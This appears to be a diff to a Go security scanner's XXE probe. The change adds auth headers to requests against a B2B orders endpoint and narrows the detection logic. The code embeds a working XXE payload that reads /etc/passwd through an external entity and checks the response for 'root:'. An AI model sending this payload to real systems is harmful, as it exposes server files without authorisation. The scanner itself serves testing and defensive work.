@@ -85,11 +85,15 @@ func (p *InjectionProber) testXXE(cfg *ProberConfig) []types.Finding {
 	// XXE via B2B order endpoint
 	xxePayload := `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><order><productId>1</productId><quantity>1&xxe;</quantity><price>0.01</price></order>`
 
+	headers := map[string]string{"Content-Type": "application/xml"}
+	if cfg.AuthToken != "" {
+		headers["Authorization"] = cfg.AuthToken
+	}
 	status, _, respBody, err := cfg.DoRequest("POST", cfg.BaseURL+"/b2b/v2/orders",
-		strings.NewReader(xxePayload), map[string]string{"Content-Type": "application/xml"})
+		strings.NewReader(xxePayload), headers)
 	if err == nil {
 		lowerBody := strings.ToLower(respBody)
-		if status == 200 || strings.Contains(lowerBody, "root:") || strings.Contains(lowerBody, "order") {
+		if (status == 200 && (strings.Contains(lowerBody, "order") || strings.Contains(lowerBody, "coupons_2013"))) || strings.Contains(lowerBody, "root:") {
 			sev := "High"
 			if strings.Contains(respBody, "root:") {
 				sev = "Critical"
@@ -111,9 +115,13 @@ func (p *InjectionProber) testXXE(cfg *ProberConfig) []types.Finding {
 
 	// Also try JSON with XML content type
 	jsonAsXML := `{"productId":1,"quantity":1}`
+	jsonHeaders := map[string]string{"Content-Type": "application/json"}
+	if cfg.AuthToken != "" {
+		jsonHeaders["Authorization"] = cfg.AuthToken
+	}
 	s2, _, rb2, e2 := cfg.DoRequest("POST", cfg.BaseURL+"/b2b/v2/orders",
-		strings.NewReader(jsonAsXML), map[string]string{"Content-Type": "application/json"})
-	if e2 == nil && (s2 == 200 || s2 == 400) {
+		strings.NewReader(jsonAsXML), jsonHeaders)
+	if e2 == nil && s2 == 200 {
 		findings = append(findings, MakeFinding(
 			"B2B Order API - Content Type Confusion",
 			"Medium",
